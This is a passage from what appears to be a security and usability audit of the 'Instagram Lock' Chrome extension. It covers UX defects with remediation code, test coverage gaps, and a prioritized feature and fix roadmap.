  static async onIdleStateChanged(newState) {
    if (newState === 'locked' || newState === 'idle') {
      await this.checkInactivity();
    }
  }
  ```
  `checkInactivity()` checks `if (Date.now() - lastActivity >= timeoutMs)`.
  If a user locks their PC screen (`Win + L` or closing laptop lid) immediately after using Instagram, elapsed inactivity is near 0. `checkInactivity()` evaluates to false and **does not lock**. Instagram remains unlocked while the workstation is locked.
- **Remediation**:
  Immediately lock the session on `newState === 'locked'`:
  ```javascript
  static async onIdleStateChanged(newState) {
    if (newState === 'locked') {
      console.log('[IG-Lock] Workstation locked. Securing session immediately.');
      await SessionManager.lock();
      await broadcastToInstagramTabs({ action: ACTIONS.SYNC_LOCK });
    } else if (newState === 'idle') {
      await this.checkInactivity();
    }
  }
  ```

---

### UX-03: Lockout Countdown Desynchronization on Page Reload (Enabled Inputs on Refresh)
- **Severity**: **HIGH** (State Consistency Defect)
- **Affected Files & Lines**: `content/content-main.js:60`, `content/lock-screen.js:379`
- **Technical Description**:
  When `content-main.js` queries `ACTIONS.GET_STATUS`, it unpacks:
  ```javascript
  const { isConfigured, isUnlocked } = response.data;
  ```
  It completely ignores `response.data.isLockedOut` and `response.data.lockoutSeconds`.
  If a user triggers a lockout and refreshes the browser tab, the lock screen renders an enabled input form rather than resuming the active countdown timer.
- **Remediation**:
  Pass `lockoutSeconds` to `applyLock()` and `lockScreen.mount()`. If `lockoutSeconds > 0`, immediately start `startLockoutCountdown()`.

---

### UX-04: Multi-Tab Lockout Timer Desynchronization Across Open Tabs
- **Severity**: **MEDIUM** (State Consistency Defect)
- **Affected File & Lines**: `content/lock-screen.js:489-520`
- **Technical Description**:
  The countdown timer is managed locally inside the tab where incorrect passwords were submitted. Other open Instagram tabs display active, unlocked input fields. Submitting a guess in another tab fails with lockout error, only then triggering a local timer.

---

### UX-05: Anti-FOUC Preloader Blank Screen Latency (50ms–250ms) on Authenticated Reloads
- **Severity**: **MEDIUM** (Performance & Visual Ergonomics)
- **Affected File & Lines**: `content/content-loader.js:14-18`
- **Technical Description**:
  Because `content-loader.js` hides `body` with `display: none !important` at `document_start`, and unhiding requires dynamic script import and IPC with the service worker, authenticated users experience an annoying 50ms–250ms blank black screen flicker on every reload.
- **Remediation**:
  Apply a high-blur overlay (`backdrop-filter: blur(35px)`) over Instagram content rather than removing `body` from layout.

---

### UX-06: Accessibility Gaps & WCAG 2.1 AA Compliance Failures
- **Severity**: **MEDIUM** (Accessibility Non-Compliance)
- **Affected File & Lines**: `content/lock-screen.js:345-360`
- **Technical Violations**:
  1. **WCAG 1.3.1 & 4.1.2 (Level A)**: `#ig-lock-input` lacks an associated `<label>` or `aria-label`. Placeholder text alone violates accessible naming standards.
  2. **WCAG 4.1.3 (Level AA)**: Error message container `#ig-error-banner` lacks `role="alert"` or `aria-live="polite"`. Assistive technologies fail to announce error and lockout messages.
  3. **WCAG 4.1.2 (Level A)**: Eye toggle button lacks `aria-pressed="true|false"`.
  4. **WCAG 1.4.3 (Level AA)**: Error message text color (`#ff4d4f`) against dark tinted card has a contrast ratio of ~4.2:1, failing the mandatory 4.5:1 minimum threshold.

---

### UX-07: Password Visibility Toggle Fails to Change Icon Shape
- **Severity**: **MEDIUM** (Visual Ergonomics)
- **Affected File & Lines**: `content/lock-screen.js:399-403`
- **Technical Description**:
  Toggling password visibility only changes opacity from `1` to `0.6`, without replacing the eye icon with an eye-slash SVG. Users cannot tell whether the password is intentionally shown or if the button is disabled.

---

### UX-08: Modal Card Responsive Viewport Clipping on Small Screen Heights
- **Severity**: **MEDIUM** (Visual Usability)
- **Affected File & Lines**: `content/lock-screen.js:118-123`
- **Technical Description**:
  The modal `.card` lacks `max-height` and `overflow-y: auto`. On small screens (e.g., mobile landscape mode or displays with virtual keyboards opened), the input and action buttons overflow past the bottom of the viewport and cannot be scrolled into view.

---

### UX-09: Settings UI Requires Manual Save and Lacks Password Feedback
- **Severity**: **LOW** (Ergonomic Polish)
- **Affected Files**: `options/options.html`, `options/options.js`
- **Technical Description**:
  Options toggles require clicking "Save Preferences" rather than auto-saving. Password change fields in Options lack show/hide visibility toggles and omit the interactive password strength meter that exists in `pages/setup.html`.

---

### UX-10: Extension Popup Lacks Direct Unlock and Dynamic Storage Sync
- **Severity**: **LOW** (Functional Convenience)
- **Affected Files**: `popup/popup.html`, `popup/popup.js`
- **Technical Description**:
  When locked, the popup shows "Session Locked" and disables its action button. Users cannot unlock directly from the popup; they must switch to an Instagram tab. Furthermore, `popup.js` does not listen to `chrome.storage.onChanged`, rendering open popups stale when timeouts expire.

---

## Section 6: Test Suite Health & Deficit Analysis (R1)

### 6.1 Status & Verification of Existing Test Suite
- **Automated CLI Unit Tests**:
  - Script: `tests/crypto.test.js` (83 lines, Node.js + Web Crypto).
  - Execution Command: `node tests/crypto.test.js`
  - Result: **12/12 PASSING (0 Failures, Exit Code 0)**.
  - Verified assertions:
    1. `bufferToHex` output: `000fff802a` (preserves leading zeroes).
    2. `hexToBuffer` round-trip byte restoration.
    3. 16-byte salt produces 32-character hex string.
    4. Consecutive salts are cryptographically distinct.
    5. Hash produces 64 hex characters (256 bits).
    6. `verifyPassword` returns true for correct credentials.
    7. `verifyPassword` returns false for wrong credentials.
    8. `verifyPassword` returns false with tampered salt.
    9. `timingSafeEqual` returns true on identical strings.
    10. `timingSafeEqual` returns false on single character difference.
    11. `timingSafeEqual` returns false on length mismatch.
    12. `hashPassword` rejects empty input strings.

### 6.2 Browser Runner (`tests/runner.html`) Discrepancy Analysis
- `tests/runner.html` tests only **8 test cases**, omitting 4 critical edge cases tested in `tests/crypto.test.js`:
  - Tampered salt rejection.
  - Timing-safe equal length difference rejection.
  - Empty password validation.
  - Buffer leading-zero preservation.
- `runner.html` must be synchronized with `crypto.test.js` to ensure uniform test validity across browser and CLI environments.

### 6.3 Critical Coverage Deficit: 12 Untested Files (0% Coverage)
The repository contains 13 production JavaScript files. Only `shared/crypto.js` has unit tests. **Twelve (12) core extension files have 0% automated test coverage:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    UNTESTED CODEBASE MODULES (0% TEST COVERAGE)             │
├─────────────────────────────────────────────────────────────────────────────┤
│ Shared Modules:                                                             │
│ • shared/constants.js  ─ getLockoutDuration() boundary cases untested       │
│ • shared/storage.js    ─ Local & session storage wrappers untested          │
│ • shared/messaging.js  ─ Message sending, sender validation untested        │
│                                                                             │
│ Background Service Worker:                                                  │
│ • background/auth-manager.js       ─ Progressive lockout & TOCTOU untested  │
│ • background/session-manager.js    ─ Ephemeral authentication state untested│
│ • background/inactivity-manager.js ─ Alarm scheduling & idle logic untested │
│ • background/service-worker.js     ─ Action routing & tab listeners untested│
│                                                                             │
│ Content Scripts:                                                            │
│ • content/content-loader.js   ─ document_start shield insertion untested    │
│ • content/content-main.js     ─ Status initialization & DOM guard untested  │
│ • content/lock-screen.js      ─ Shadow DOM mount, focus trap, form untested │
│ • content/activity-tracker.js ─ Throttled event listeners untested          │
│                                                                             │
│ Extension UI Pages:                                                         │
│ • popup/popup.js     ─ Status rendering & lock action untested              │
│ • options/options.js ─ Settings persistence & password change untested       │
│ • pages/setup.js     ─ Password strength scoring & onboarding untested      │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 6.4 Test Modernization & Integration Roadmap
1. **Mock Chrome Extension API**: Build a standard mock library (`tests/mocks/chrome-mock.js`) covering `chrome.storage.local`, `chrome.storage.session`, `chrome.alarms`, `chrome.runtime`, `chrome.tabs`, and `chrome.idle`.
2. **Unit Test Suite for Background Managers**:
   - `auth-manager.test.js`: Test initial setup, progressive lockout delays, and race-free concurrent verification.
   - `session-manager.test.js`: Test unlock state flags, session timestamp updates, and lock invalidation.
   - `inactivity-manager.test.js`: Test alarm creation, elapsed time calculations, and immediate lock on `newState === 'locked'`.
3. **DOM & Focus Trap Unit Tests**:
   - `lock-screen.test.js`: Utilize JSDOM to mount `LockScreenManager` into a fake document, asserting closed shadow DOM, form validation, and focus trapping behavior.
4. **Continuous Integration**:
   - Configure npm test script and GitHub Actions workflow executing `node tests/crypto.test.js` and headless Chrome runner.

---

## Section 7: Feature & Improvement Recommendations (Requirement R2)

To elevate Instagram Lock into a comprehensive privacy and digital wellbeing product, recommended additions have been prioritized across **Security Hardening**, **User Experience**, and **Productivity / Selective Controls**.

### 7.1 Prioritized Categories & Feature Catalog

#### Category A: Security Hardening
1. **[P0] Immediate Workstation Lock Enforcement**: Lock session immediately on `chrome.idle.onStateChanged` with `newState === 'locked'`.
2. **[P0] Closed Shadow DOM & Resilient DOM Guard**: Switch to `mode: 'closed'` and observe `document.documentElement` with `subtree: true` and style attribute filters.
3. **[P0] Internal IPC Role Separation**: Restrict settings and password changes exclusively to internal extension pages (`!sender.tab`).
4. **[P0] Atomic Verification Mutex**: Prevent TOCTOU concurrency bypasses during parallel password verification.
5. **[P1] WebAuthn Biometric Authentication**: Support Touch ID, Windows Hello, and security keys via `navigator.credentials.get()`.
6. **[P1] Offline Emergency Recovery Key**: Generate a 16-character alphanumeric recovery key during setup to allow recovery if password is forgotten.
7. **[P1] True Exponential Backoff**: Implement escalating penalties (30s -> 5m -> 30m -> 24h) to eliminate brute-force viability.
8. **[P2] Decoy PIN / Duress Mode**: Provide a secondary PIN that unlocks the overlay but redirects to a neutral public feed under coercion.

#### Category B: User Experience & Aesthetics
1. **[P0] WCAG 2.1 AA Accessibility Overhaul**: Fix Shadow DOM focus trap, add `<label>` / `aria-label`, live regions (`role="alert"`), and eye-slash toggle icons.
2. **[P0] Quick Lock Global Shortcut (`Alt + Shift + L`)**: Declare `chrome.commands` in `manifest.json` to allow one-touch locking from anywhere.
3. **[P0] Tab Reload Lockout Timer Persistence**: Pass `lockoutSeconds` to content script on startup to resume countdown timers across reloads.
4. **[P1] Direct Unlock from Extension Popup**: Allow users to enter master password directly inside `popup.html`.
5. **[P1] Dynamic Light / Dark Instagram Theme Matching**: Automatically detect Instagram theme (`_theme-dark` vs light) and style overlay to match.
6. **[P1] Smooth Backdrop Blur Transition**: Replace jarring `display: none` unmasking with a 300ms `backdrop-filter: blur(25px)` fade out.
7. **[P2] Configurable Audio / Haptic Feedback**: Optional audio cue on unlock success and subtle shake sound on failure.

#### Category C: Productivity & Selective Privacy Controls
1. **[P0] Selective Feature Blocking (Reels & Explore vs Direct Messages)**:
   - Provide three lock modes:
     - *Full Site Lock*: Protect all of Instagram (current behavior).
     - *Reels & Explore Blocker*: Lock `/reels/*` and `/explore/*` to prevent mindless scrolling while keeping Direct Messages open.
     - *DM Privacy Lock*: Lock only `/direct/*` messages to protect sensitive client communications while allowing public browsing.
2. **[P1] Daily Usage Time Limits & Screen Time Quotas**:
   - Set daily budget (e.g. 30 minutes/day). Once budget is exhausted, lock Instagram until next calendar day unless master password overrides.
3. **[P1] Scheduled Focus / Bedtime Locking**:
   - Schedule recurring lockdown windows (e.g., 10:00 PM – 7:00 AM) to curb late-night browsing.
4. **[P1] Security Audit Log**:
   - Maintain a local, timestamped log of the last 30 unlock attempts (Timestamp, Status: Success/Failure, Origin: Content/Popup) viewable in Options.

---

### 7.2 Master Impact vs. Effort Prioritization Matrix

```
       HIGH IMPACT
          ▲
          │  [P0] Workstation OS Lock Fix       [P1] WebAuthn Biometrics
          │  [P0] Shadow DOM Focus Trap Fix     [P0] Selective Reels/DM Lock
          │  [P0] Quick Lock (Alt+Shift+L)      [P1] Daily Time Limits
          │  [P0] Role-Based IPC Security       [P1] Scheduled Focus Windows
          │  [P0] Closed Shadow DOM Encaps.     [P1] Emergency Recovery Key
          │  [P1] Direct Popup Unlock           [P1] Exponential Backoff
          │
          │  [P1] Dynamic Theme Matching
          │  [P1] Security Audit Log            [P2] Decoy PIN / Duress Mode
          │  [P2] Audio/Haptic Cues             [P2] Custom Lock Message
          │
          └────────────────────────────────────────────────────────►
          LOW EFFORT                                    HIGH EFFORT
```

### 7.3 Priority Action Tiers & Implementation Blueprints

#### Priority Tier 0 (P0): Critical Security, Integrity & UX Fixes (Immediate)

| Priority | Target Component | Action Item | Implementation Blueprint |
| :---: | :--- | :--- | :--- |
| **P0** | `content/lock-screen.js:47` | Encapsulate Closed Shadow DOM | Change `mode: 'open'` to `mode: 'closed'`. Eliminates page script credential sniffing. |
| **P0** | `content/content-main.js:105-115` | Fix DOM Guard MutationObserver | Observe `documentElement` with `subtree: true` and attribute filters; verify computed visibility. |
| **P0** | `content/lock-screen.js:467-471` | Fix Shadow DOM Focus Trap | Replace `document.activeElement` with `this.shadowRoot.activeElement`. Prevents focus leaks. |
| **P0** | `background/inactivity-manager.js:70` | Lock on Workstation Screen Lock | On `chrome.idle.onStateChanged` with `newState === 'locked'`, lock immediately without delay. |
| **P0** | `background/service-worker.js:28-40` | Implement Sender Role Authorization | Reject `SET_PASSWORD`, `CHANGE_PASSWORD`, `UPDATE_SETTINGS` if `sender.tab` is present. |
| **P0** | `background/auth-manager.js:71-107` | Serialize Password Verification | Introduce mutex promise queue in `AuthManager.verify` to eliminate TOCTOU burst race. |
| **P0** | `manifest.json`, `service-worker.js` | Quick Lock Shortcut (`Alt+Shift+L`) | Declare `"commands"` in manifest; invoke `SessionManager.lock()` on `chrome.commands.onCommand`. |
| **P0** | `content/content-main.js:60` | Resume Lockout on Tab Reload | Pass `lockoutSeconds` from `GET_STATUS` to `lockScreen.mount()` and resume timer. |
| **P0** | `content/content-loader.js:50-55` | Enforce Fail-Closed Preloader | Replace shield removal on import error with persistent error curtain. |

#### Priority Tier 1 (P1): High-Value Enhancements & Commercial Polish

| Priority | Feature / Enhancement | Target Component | Implementation Blueprint |
| :---: | :--- | :--- | :--- |
| **P1** | **Selective Feature Blocking** | `content/content-main.js`, `options/options.html` | Match route on `popstate` / URL updates. Lock only `/reels/*` or `/direct/*` based on user preference. |
| **P1** | **WebAuthn Biometrics** | `content/lock-screen.js`, `background/auth-manager.js` | Use `navigator.credentials.get()` to permit Touch ID / Windows Hello fingerprint unlock. |
| **P1** | **Direct Popup Unlock** | `popup/popup.html`, `popup/popup.js` | Embed password input in popup when locked, triggering `ACTIONS.VERIFY_PASSWORD`. |
| **P1** | **Emergency Recovery Key** | `pages/setup.html`, `background/auth-manager.js` | Generate 16-char alphanumeric recovery key during setup; PBKDF2 hash stored in local storage. |
| **P1** | **Dynamic Dark/Light Theme** | `content/lock-screen.js:90-320` | Check `document.documentElement` class `_theme-dark` and adjust CSS variables accordingly. |
| **P1** | **Daily Usage Limits** | `background/inactivity-manager.js` | Track cumulative active browsing time; lock when daily budget (e.g. 30m) expires. |
| **P1** | **Unlock Audit Log** | `background/session-manager.js`, `options/` | Record timestamp, outcome, and origin for the last 30 attempts in `chrome.storage.local`. |

#### Priority Tier 2 (P2): Advanced & Specialized Features

| Priority | Feature / Enhancement | Target Component | Implementation Blueprint |
| :---: | :--- | :--- | :--- |
| **P2** | **Decoy PIN / Duress Mode** | `background/auth-manager.js` | Secondary password unmounts overlay but navigates to a sanitized public explore page. |
| **P2** | **Scheduled Bedtime Lockdown** | `background/inactivity-manager.js` | Configure recurring blackout hours where Instagram remains locked. |
| **P2** | **Audio / Haptic Feedback** | `content/lock-screen.js` | Subtle Web Audio API chime on successful unlock; gentle vibration/buzz on error. |

---

## Conclusion & Implementation Roadmap

The **Instagram Lock** Chrome extension has a strong architectural foundation featuring native Web Crypto PBKDF2-HMAC-SHA256, timing-safe equality checks, and ephemeral `chrome.storage.session` isolation.

However, critical vulnerabilities exist at the presentation and DOM boundary—specifically open Shadow DOM credential exposure (SEC-01), the broken MutationObserver DOM guard (SEC-02), fail-open preloader shielding (SEC-03), and unauthenticated IPC message handling (SEC-04). In addition, prominent usability bugs such as the Shadow DOM focus trap failure (UX-01) and workstation lock bypass (UX-02) compromise operational effectiveness.

By executing the prioritized remediations outlined above—beginning with the **Priority 0 (P0)** security and UX patches, followed by **Priority 1 (P1)** enhancements (Selective Reels/DM locking, WebAuthn biometrics, and popup unlock)—the extension will achieve enterprise-grade security, robust accessibility compliance, and superior user engagement suitable for widespread Chrome Web Store distribution.
